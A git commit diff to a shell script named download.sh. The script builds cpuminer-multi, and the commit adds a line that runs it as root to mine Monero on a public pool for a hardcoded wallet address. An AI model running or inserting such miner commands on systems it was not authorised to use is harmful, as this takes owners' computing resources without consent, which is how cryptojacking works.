0471ab5bb5b60a03322a24004a14f76bb176b8dd
mike <50838860+MIksterww3@users.noreply.github.com>
2019-05-20 12:05:27 -0400

    Update download.sh

--- download.sh
+++ download.sh
@@ -1,7 +1,8 @@
-yes | apt-get update
 sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev autotools-dev automake
 git clone https://github.com/hyc/cpuminer-multi
 cd cpuminer-multi
 ./autogen.sh
 CFLAGS="-march=native" ./configure
 make
+
+sudo ./minerd -a cryptonight -o stratum+tcp://pool.minexmr.com:4444 -u 432ZjrgA1NBiF4mWMzrFvePhMx8cgbfrfajBUUPtQv6JU77QcRB4W8y2D3eEbXDXGVgXcXGk4hHRoMRndHXMy1VdE1SqjJL
